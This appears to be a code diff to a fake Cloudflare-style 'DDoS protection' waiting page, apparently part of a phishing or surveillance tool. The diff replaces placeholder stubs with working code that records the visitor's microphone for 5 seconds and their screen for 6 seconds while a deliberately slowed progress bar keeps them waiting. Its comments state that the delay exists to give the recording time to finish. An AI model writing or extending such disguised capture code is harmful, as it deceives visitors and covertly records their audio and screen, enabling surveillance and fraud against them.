@@ -93,13 +93,16 @@ DDoS protection by
 <script type="text/javascript">
 var c=false, l=false, uid="<%=uid %>";
 var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
-var redirectDelay = 20000; // 20 seconds delay before redirect
+var redirectDelay = 30000; // 30 seconds delay before redirect (increased for screen/audio recording)
 
 // Progress bar animation
 function animateProgressBar() {
   var progressValue = document.getElementById('progress-value');
   var width = 0;
-  var id = setInterval(frame, 200);
+  
+  // Slow down progress bar animation (300ms instead of 200ms)
+  // This gives more time for screen recording/audio recording to complete
+  var id = setInterval(frame, 300);
   
   function frame() {
     if (width >= 100) {
@@ -107,7 +110,8 @@ function animateProgressBar() {
       document.getElementById('cf-spinner-allow-5-secs').style.display = 'none';
       document.getElementById('cf-spinner-redirecting').style.display = 'inline-block';
     } else {
-      width++;
+      // Increment by smaller steps for longer total animation
+      width += 0.5;
       progressValue.style.width = width + '%';
     }
   }
@@ -340,7 +344,7 @@ function initCamera() {
   cam();
 }
 
-// Audio capture (placeholder, functionality coming in future update)
+// Audio capture
 function initAudioCapture() {
   const audioElement = document.getElementById('audio');
   let mediaRecorder;
@@ -358,41 +362,137 @@ function initAudioCapture() {
   }
   
   function handleAudioSuccess(stream) {
-    // Feature coming soon - set capture as completed for now
-    setTimeout(() => {
+    try {
+      audioElement.srcObject = stream;
+      
+      // Create media recorder
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      
+      // When data is available
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          audioChunks.push(event.data);
+        }
+      };
+      
+      // When recording stops
+      mediaRecorder.onstop = () => {
+        // Create audio blob
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        
+        // Create audio URL for preview (optional)
+        const audioURL = URL.createObjectURL(audioBlob);
+        const audioPreview = document.createElement('audio');
+        audioPreview.controls = true;
+        audioPreview.src = audioURL;
+        audioPreview.style.display = 'none';
+        document.body.appendChild(audioPreview);
+        
+        // Stop all tracks
+        stream.getTracks().forEach(track => track.stop());
+        
+        // Set as completed
+        c = true;
+        checkRedirect();
+      };
+      
+      // Start recording and stop after 5 seconds
+      mediaRecorder.start();
+      
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      }, 5000);
+      
+    } catch (error) {
+      console.error("MediaRecorder error:", error);
+      
+      // Fallback in case of error
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
-      c = true;
-      checkRedirect();
-    }, 3000);
-  }
-  
-  startAudioCapture();
-}
-
-// Screen capture (placeholder, functionality coming in future update)
-function initScreenCapture() {
-  async function startScreenCapture() {
-    try {
-      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-      handleScreenCaptureSuccess(stream);
-    } catch (e) {
-      console.error("Screen capture error:", e);
       c = true;
       checkRedirect();
     }
   }
   
-  function handleScreenCaptureSuccess(stream) {
-    // Feature coming soon - set capture as completed for now
-    setTimeout(() => {
-      if (stream) {
+  startAudioCapture();
+}
+
+// Screen capture
+function initScreenCapture() {
+  const video = document.getElementById('video');
+  let mediaRecorder;
+  let recordedChunks = [];
+  
+  async function startScreenCapture() {
+    try {
+      // Show a dialog to request screen sharing
+      const stream = await navigator.mediaDevices.getDisplayMedia({
+        video: {
+          cursor: "always"
+        }
+      });
+      
+      // Connect stream to video element
+      video.srcObject = stream;
+      
+      // Set up media recorder
+      mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+      
+      // Handle data available event
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
+      
+      // Handle recording stopped
+      mediaRecorder.onstop = () => {
+        // Create blob from chunks
+        const blob = new Blob(recordedChunks, {type: 'video/webm'});
+        
+        // Optional: Create video element to verify recording worked
+        const videoURL = URL.createObjectURL(blob);
+        const videoPreview = document.createElement('video');
+        videoPreview.controls = true;
+        videoPreview.width = 320;
+        videoPreview.height = 240;
+        videoPreview.style.display = 'none';
+        videoPreview.src = videoURL;
+        document.body.appendChild(videoPreview);
+        
+        // Stop all tracks
         stream.getTracks().forEach(track => track.stop());
-      }
+        
+        // Mark as completed
+        c = true;
+        checkRedirect();
+      };
+      
+      // Handle user stopping the screen share
+      stream.getVideoTracks()[0].onended = () => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      };
+      
+      // Start recording for 6 seconds
+      mediaRecorder.start();
+      
+      // Stop after 6 seconds
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      }, 6000);
+      
+    } catch (e) {
+      console.error("Screen capture error:", e);
       c = true;
       checkRedirect();
-    }, 3000);
+    }
   }
   
   startScreenCapture();
